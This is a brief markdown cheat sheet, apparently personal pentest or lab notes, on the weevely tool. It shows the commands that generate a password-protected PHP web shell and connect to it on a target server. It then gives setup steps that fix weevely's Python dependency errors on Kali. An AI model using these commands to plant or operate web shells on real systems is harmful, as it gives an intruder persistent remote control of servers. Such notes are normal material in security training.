
## weevely
generate webshell
```
weevely generate <password> shell.php
```

> [!NOTE]
> how to upload shell to server will vary

run webshell
```
weevely http://target/uploads/shell.php <password>
```

### fix python errors in kali
```
sudo mkdir /opt/weevely
sudo chown champuser:champuser /opt/weevely
cp -r /usr/share/weevely /opt/weevely/weevely-src
cd /opt/weevely
python3 -m venv .venv
source .venv/bin/activate
pip install mako pyyaml PySocks python-dateutil telnetlib3 setuptools prettytable
echo "import telnetlib3 as telnetlib" > .venv/lib/python3.13/site-packages/telnetlib.py

# creating launcher
sudo nano /usr/local/bin/weevely-fixed
#!/bin/bash
source /opt/weevely/.venv/bin/activate
python -W ignore /opt/weevely/weevely-src/weevely.py "$@"

sudo chmod +x /usr/local/bin/weevely-fixed
```
